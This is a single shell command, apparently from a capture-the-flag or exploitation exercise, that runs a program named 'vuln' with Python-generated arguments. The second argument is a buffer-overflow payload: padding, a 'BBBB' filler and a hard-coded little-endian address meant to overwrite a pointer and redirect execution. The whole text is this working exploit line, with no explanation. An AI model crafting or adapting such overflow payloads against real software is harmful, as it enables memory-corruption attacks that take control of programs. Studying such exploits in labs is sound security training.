./vuln `python -c 'print "A"*4'` `python -c 'print "A"*0x14 + "BBBB" + "\xa2\x91\x04\x08" + "A" * 0xea'`
